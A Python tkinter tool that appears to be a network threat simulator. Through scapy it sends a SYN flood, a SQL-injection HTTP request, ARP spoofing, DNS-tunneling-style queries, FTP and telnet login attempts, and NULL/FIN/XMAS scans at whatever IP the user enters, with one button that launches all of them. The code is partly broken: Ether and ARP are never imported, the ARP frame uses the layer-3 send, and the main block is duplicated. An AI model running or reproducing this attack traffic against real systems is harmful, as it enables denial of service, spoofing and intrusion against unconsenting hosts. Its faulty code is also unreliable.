import tkinter as tk
from tkinter import messagebox, Toplevel, StringVar, Entry, Label, Button
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send
import random
import threading
import time

class SimuladorAmenazas:
    def __init__(self, ip_objetivo):
        self.ip_objetivo = ip_objetivo

    def syn_flood(self, cantidad=50):
        for _ in range(cantidad):
            pkt = IP(dst=self.ip_objetivo) / TCP(dport=random.randint(20, 1024), flags="S")
            send(pkt, verbose=False)

    def ftp_simulado(self):
        pkt = IP(dst=self.ip_objetivo) / TCP(dport=21, sport=12345, flags="PA") / Raw(load="USER anonymous\r\nPASS guest@\r\n")
        send(pkt, verbose=False)

    def telnet_simulado(self):
        pkt = IP(dst=self.ip_objetivo) / TCP(dport=23, sport=12345, flags="PA") / Raw(load="root\r\n")
        send(pkt, verbose=False)

    def arp_spoof_simulado(self):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=self.ip_objetivo, hwsrc="00:11:22:33:44:55")
        send(pkt, verbose=False)

    def dns_tunneling_simulado(self):
        dominio = "a" * 85 + ".example.com"
        pkt = IP(dst=self.ip_objetivo) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=dominio))
        send(pkt, verbose=False)

    def http_inyeccion(self):
        http_payload = (
            "GET /busqueda?nombre=admin'-- HTTP/1.1\r\n"
            f"Host: {self.ip_objetivo}\r\n"
            "User-Agent: sqlmap/1.4.3\r\n"
            "\r\n"
        )
        pkt = IP(dst=self.ip_objetivo) / TCP(dport=80, flags="PA") / Raw(load=http_payload)
        send(pkt, verbose=False)

    def tcp_null_fin_xmas(self):
        # NULL scan
        send(IP(dst=self.ip_objetivo)/TCP(dport=80, flags=""), verbose=False)
        # FIN scan
        send(IP(dst=self.ip_objetivo)/TCP(dport=80, flags="F"), verbose=False)
        # XMAS scan
        send(IP(dst=self.ip_objetivo)/TCP(dport=80, flags="FPU"), verbose=False)

class InterfazSimulador:
    def __init__(self, root):
        self.root = root
        self.root.title("Simulador de Amenazas (Red Local)")
        self.root.geometry("400x500")
        self.ip_var = tk.StringVar()

        Label(root, text="IP del objetivo:").pack(pady=5)
        Entry(root, textvariable=self.ip_var, width=30).pack(pady=5)

        Button(root, text="SYN Flood", width=20, command=self.lanzar_syn).pack(pady=5)
        Button(root, text="HTTP Inyección", width=20, command=self.lanzar_http_inyeccion).pack(pady=5)
        Button(root, text="FTP simulado", width=20, command=self.lanzar_ftp).pack(pady=5)
        Button(root, text="TELNET simulado", width=20, command=self.lanzar_telnet).pack(pady=5)
        Button(root, text="ARP Spoofing", width=20, command=self.lanzar_arp).pack(pady=5)
        Button(root, text="DNS Tunneling", width=20, command=self.lanzar_dns).pack(pady=5)
        Button(root, text="TCP NULL/FIN/XMAS", width=25, command=self.lanzar_tcp_variantes).pack(pady=5)
        Button(root, text="Ejecutar TODOS", width=25, bg="red", fg="white", command=self.lanzar_todos).pack(pady=15)

    def obtener_ip(self):
        ip = self.ip_var.get()
        if not ip:
            messagebox.showerror("Error", "Por favor, ingresa una IP válida.")
        return ip

    def ejecutar_ataque(self, funcion):
        ip = self.obtener_ip()
        if ip:
            threading.Thread(target=lambda: funcion(ip)).start()

    def lanzar_syn(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).syn_flood())

    def lanzar_http_inyeccion(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).http_inyeccion())

    def lanzar_ftp(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).ftp_simulado())

    def lanzar_telnet(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).telnet_simulado())

    def lanzar_arp(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).arp_spoof_simulado())

    def lanzar_dns(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).dns_tunneling_simulado())

    def lanzar_tcp_variantes(self):
        self.ejecutar_ataque(lambda ip: SimuladorAmenazas(ip).tcp_null_fin_xmas())

    def lanzar_todos(self):
        self.ejecutar_ataque(lambda ip: self.ejecutar_todos(ip))

    def ejecutar_todos(self, ip):
        sim = SimuladorAmenazas(ip)
        sim.syn_flood()
        time.sleep(1)
        sim.ftp_simulado()
        time.sleep(1)
        sim.telnet_simulado()
        time.sleep(1)
        sim.arp_spoof_simulado()
        time.sleep(1)
        sim.dns_tunneling_simulado()
        time.sleep(1)
        sim.http_inyeccion()
        time.sleep(1)
        sim.tcp_null_fin_xmas()
        messagebox.showinfo("Completado", "Todos los ataques fueron ejecutados.")

if __name__ == "__main__":
    root = tk.Tk()
    app = InterfazSimulador(root)
    root.mainloop()

if __name__ == "__main__":
    root = tk.Tk()
    app = InterfazSimulador(root)
    root.mainloop()
